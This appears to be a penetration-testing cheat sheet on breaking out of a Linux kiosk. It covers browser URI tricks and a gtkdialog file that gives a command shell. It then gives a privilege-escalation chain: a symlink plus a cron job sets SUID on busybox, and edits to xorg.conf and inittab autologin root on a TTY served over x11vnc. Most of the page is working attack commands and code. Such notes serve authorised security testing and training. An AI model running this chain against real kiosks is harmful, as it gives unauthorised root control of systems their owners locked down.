---
layout:     post
author:     0x5c4r3
type: docs
permalink: Linux_Kiosk_Break
---


<span style="font-size: 35px; color:red"><b>Linux Kiosk Breakout</b></span>
&nbsp;

```shell
sudo apt install tigervnc-viewer
```

Use <span style="color:red">xtigervncviewer</span> to connect.

If the kiosk presents a browser page, try:
- <span style="color:red">file:///var/www/localhost/</span>
- <span style="color:red">file:///var/www/localhost/index.html</span>
- <span style="color:red">chrome://</span>, <span style="color:red">ftp://</span>, <span style="color:red">mailto:</span>, <span style="color:red">smb://</span>, <span style="color:red">irc://</span>

Some of these might open a pop-up window that allows you to <span style="color:red">browse</span> and choose the program you want to use to open the link.
Interesting ones to exploit: <span style="color:red">gtkdialog</span>, <span style="color:red">firefox</span> (to open another firefox window with another profile, unlocking new functions on upper right corner)

If you can access the tools, search <span style="color:red">Web Developer </span> > <span style="color:red">Scratchpad</span>.

You can create the following script and save it as <span style="color:red">terminal.txt</span> to get Local Code Execution:
```html
<window>
  <vbox>
    <vbox scrollable="true" width="500" height="400">
        <edit>
          <variable>CMDOUTPUT</variable>
          <input file>/tmp/termout.txt</input>
        </edit>
    </vbox>
    <hbox>
      <text><label>Command:</label></text>
      <entry><variable>CMDTORUN</variable></entry>
      <button>
          <label>Run!</label>  
          <action>$CMDTORUN > /tmp/termout.txt</action>
          <action>refresh:CMDOUTPUT</action>  
      </button>
    </hbox>
  </vbox>
</window>
```

And call it from Firefox like <span style="color:red">irc://asd -f <path_to_terminal.txt></span>.
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Privilege Escalation</b></span>
Check SUID: <span style="color:red">find / -perm -u=s -exec ls -al {} +</span>
Check running root processes: <span style="color:red">ps aux</span>
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Example of Privilege Excalation</b></span>
Openbox running as root process, if you run <span style="color:red">openbox --replace</span> it will reset everything and re-create the <span style="color:red">/home/guest/.mozilla/firefox/c3pp43bg.default/bookmarks.html</span> file. This allows you to write into privileged directories (<span style="color:red">ln -s /usr/bin /home/guest/.mozilla/firefox/c3pp43bg.default</span>).
You can create a script like the following (<span style="color:red">testscript.sh</span>):
```shell
echo "#!/bin/bash" > /etc/cron.hourly/bookmarks.html
echo "chown root:root /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html
echo "chmod +s /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html
```
This will set SUID bit on our local busybox file using chronojobs.
Once done, create a <span style="color:red">runterminal.sh</span>:
```shell
#!/bin/bash
/usr/bin/gtkdialog -f /home/guest/terminal.txt
```
and execute it like <span style="color:red">/home/guest/busybox sh /home/guest/runterminal.sh</span> to get root shell.

To get a better shell as root, run <span style="color:red">xdotool key Ctrl+Alt+F3</span> in our gtkdialog terminal. If nothing pops up, run:
```shell
cp /etc/X11/xorg.conf.d/10-xorg.conf /home/guest/xorg.txt
chmod 777 /home/guest/xorg.txt
```

To then comment out "DontVTSwitch" in <span style="color:red">/home/guest/xorg.txt</span>. Copy it back to its original location:
```shell
cp /home/guest/xorg.txt /etc/X11/xorg.conf.d/10-xorg.conf
```
and re-configure permissions:
```shell
chmod 644 /etc/X11/xorg.conf.d/10-xorg.conf
```
Run <span style="color:red">openbox --replace</span> again.

```shell
cp /etc/inittab /home/guest/inittab.txt
chmod 777 /home/guest/inittab.txt
```

Under the <span style="color:red">standard console login</span> section under the two commented lines, add a TTY like:
<span style="color:red">c3::respawn:/sbin/agetty --noclear --autologin root 38400 tty3 linux</span>

```shell
cp /home/guest/inittab.txt /etc/inittab
chmod 600 /etc/inittab
/sbin/init q
```
Then create a scratchpad like:
```shell
#!/bin/bash
killall x11vnc 
x11vnc -rawfb vt3
```
make it executable and run it. You should be kicked out of the session. When you will reconnect, you should have root access.
